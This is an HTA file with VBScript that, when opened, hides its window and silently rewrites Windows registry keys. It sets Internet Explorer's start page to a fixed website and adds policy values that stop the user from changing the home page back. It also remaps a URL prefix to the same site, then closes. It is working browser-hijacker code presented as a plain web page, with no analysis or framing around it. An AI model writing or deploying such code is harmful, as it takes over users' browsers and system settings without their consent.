<html><head>
<hta:application id=hta_note_id
 applicationName=hta_note_name
 showInTaskBar=no
 caption=no
 innerBorder=no
 selection=no
 scroll=no
 contextmenu=no />
<SCRIPT language=vbs>

self.MoveTo 0, 0
Set shell = CreateObject("WScript.Shell")
yer = "Start Page"
  shell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\URL\Prefixes\\mirc","http://www.videolag.com","REG_SZ"
  shell.regwrite "HKLM\Software\Policies\Microsoft\Internet Explorer\Control Panel\\HomePage","00000001","REG_DWORD"
  shell.regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\\HomePage","00000001","REG_DWORD"
  shell.regwrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\\"+yer+"", "http://www.videolag.com","REG_SZ"
  shell.regwrite "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main\\"+yer+"", "http://www.videolag.com","REG_SZ"
self.Close
</SCRIPT>
</head>
</body>
</html>
